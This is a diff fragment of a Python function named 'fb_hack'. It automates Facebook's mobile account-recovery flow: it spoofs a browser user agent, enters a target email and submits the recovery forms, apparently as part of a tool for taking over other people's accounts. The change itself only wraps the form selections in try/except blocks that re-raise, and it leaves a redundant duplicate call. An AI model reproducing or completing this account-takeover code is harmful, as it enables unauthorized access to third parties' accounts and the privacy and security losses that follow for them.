@@ -119,11 +119,18 @@ def fb_hack(email, codex, backup):
   browser.addheaders = [('User-agent', MOZILLA_UAS)]
   browser.set_handle_refresh(False)
   browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+  try:
+    browser.select_form(nr=0)
+  except:
+    raise
   browser.select_form(nr=0)
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
-  browser.select_form(nr=0)
+  try:
+    browser.select_form(nr=0)
+  except:
+    raise
   browser.submit()
   browser.select_form(nr=0)
   browser.submit()
